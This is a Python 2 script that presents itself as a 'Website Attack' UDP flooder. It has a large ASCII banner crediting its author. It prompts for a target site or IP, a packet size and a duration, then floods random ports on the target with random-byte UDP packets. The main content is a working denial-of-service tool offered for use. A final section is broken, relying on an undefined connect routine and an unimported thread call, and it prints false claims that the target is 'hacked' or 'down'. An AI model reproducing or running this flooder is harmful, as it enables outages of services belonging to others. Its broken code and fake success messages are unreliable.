


import socket
import random
import os, sys, subprocess,time
import os, sys, json, urllib, re
from time import sleep
os.system("clear")
reload(sys)
sys.setdefaultencoding("utf-8")

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[1m'  # bold
RR = '\033[3m'  # greencolor

def logo():
 print("""  \033[1m\033[33m#\033[31m
   \033[33m##\033[31m
   ###
    ####
     #####
     #######
      #######
      ########
      ########
      #########
      ##########
     ############
   ##############
  \033[33m#\033[31m###############
   ################
     ##############
      ##############                                              \033[33m####\033[31m
      ##############                                           #####
       ##############                                      #######
       ##############                                 ###########
       ###############                              #############
       ################                           ##############
      #################      \033[33m#\033[31m                  ################
      ##################     \033[33m##    #           \033[31m#################
     \033[33m#\033[31m###################   \033[33m###   ##          \033[31m#################
          ################  \033[33m########\033[31m          #################
           ################  \033[33m#######\033[31m         ###################
             ################\033[33m#######       \033[31m#####################
              ################\033[33m#####\033[31m       ###################
                ############################################
                 ###########################################
                 #########\033[33m##\033[31m###\033[33m##\033[31m##\033[33m#####\033[31m###################
                  ########\033[33m#\033[31m#\033[33m#\033[31m#\033[33m#\033[31m#\033[33m#\033[31m##\033[33m#\033[31m###\033[33m#\033[31m##################
                  ########\033[33m#\033[31m##\033[33m#\033[31m##\033[33m#\033[31m##\033[33m#\033[31m#\033[33m#\033[31m####################
                   #######\033[33m#\033[31m#####\033[33m#\033[31m##\033[33m#\033[31m###\033[33m#\033[31m#################
                   ######################################
                    ##########################      #####
                    ###  ###################           \033[33m##\033[31m
                    ##    ###############
                    \033[33m#\033[31m     ##  ##########   \033[33mMr \033[31m.\033[33m Hlaingphyo\033[31m
                              ##   ####
                                    ###
                                 \033[33m    ##\033[31m
          \033[33m-by \033[31mS\033[33mhlaingphyo\033[31mP\033[33mthakhinGyi\033[31m        \033[33m#\033[31m
\n\t     \033[31m\033[1m[_\033[33mWebsite Attack\033[31m_]
 \n\033[0m\033[1m
\t \033[33m\033[1m[-] \033[0m\033[1mCreator : \033[33m\033[1mMr Hlaing phyo
\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mName     : \033[33m\033[1mMr.Hlaing phyo Ddos
\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mSite     : \033[33mwww.hlaingphyoaung.weebly.com
\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mCoded by :\033[1m \033[33m[  \033[32m\033[1mHlaing Phyo \033[33m ]
\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mSec.Code : \033[33m\033[1mMr White\033[0m
\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mDate     : \033[33m\033[1m8/31/2019\033[0m
  """)


logo()

print("\n\n\n\t\t\033[32m\033[1mMr.HlaingPhyo")
print("\033[33m\033[1m       UDP Port Flooder By \033[31m8h4i\033[0m")

attack = raw_input("\n\n\n\033[1mWebsite or IP ==> \033[33m")

print("\n\n\tEnter Flood Size (1-6000) \n")
package = input("\033[0m\033[1mFlood Size ===>\033[33m ")
print("\n\n\tEnter Time Of Flood (sec) \n")
duration = input("\033[0m\033[1mTime (Sec.) ===>\033[33m ")
durclock = (lambda:0, time.clock)[duration > 0]
duration = (1, (durclock() + duration))[duration > 0]
packet = random._urandom(package)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print("Mr.Bat Attack Started on \033[32m%s \033[33mwith \033[32m%s\033[33m bytes for \033[32m%s\033[33m seconds." % (attack, package, duration))
while True:
        if (durclock() < duration):
                port = random.randint(1, 65535)
                sock.sendto(packet, (attack, port))
        else:
                break
print("\n")
print("\n\033[31m\033[1mFlooding Completed...:D\033[33m\n")
print("Mr.Hlaing Phyo Attack has completed on \033[32m%s\033[33m for \033[32m%s\033[33m seconds by Sutariya Parixit." % (attack, duration))

def connect(i):
    try:
        sock1 = socket(AF_INET, SOCK_STREAM)
        sock1.connect((host, port))
        sock1.sendto(packet, (ip,port))
        sleep(99)
        sock1.close
    except:
    	print(" Your Target Have Been Hacked!!!")

n = 0


while 1:
    try:
        start_new_thread(connect, (n,))
    except:
        print "\n\t\t\033[33mYour Target Is Down!"
    print "\033[32m<+> mrHlaing Phyo mr Hlaing phyo"
    sleep(0.1)
